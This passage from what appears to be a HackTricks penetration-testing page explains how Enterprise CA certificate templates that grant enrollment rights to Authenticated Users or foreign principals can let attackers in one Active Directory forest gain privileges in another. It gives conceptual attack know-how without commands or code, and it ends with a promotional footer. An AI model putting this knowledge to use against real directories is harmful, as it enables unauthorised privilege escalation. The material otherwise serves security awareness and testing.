Another thing organizations need to be careful of in multi-forest environments is Enterprise CAs **publishing certificates templates** that grant **Authenticated Users or foreign principals** (users/groups external to the forest the Enterprise CA belongs to) **enrollment and edit rights**.\
When an account **authenticates across a trust**, AD adds the **Authenticated Users SID** to the authenticating user’s token. Therefore, if a domain has an Enterprise CA with a template that **grants Authenticated Users enrollment rights**, a user in different forest could potentially **enroll in the template**. Similarly, if a template explicitly grants a **foreign principal enrollment rights**, then a **cross-forest access-control relationship gets created**, permitting a principal in one forest to **enroll in a template in another forest**.

Ultimately both these scenarios **increase the attack surface** from one forest to another. Depending on the certificate template settings, an attacker could abuse this to gain additional privileges in a foreign domain.

## References

* All the information for this page was taken from [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
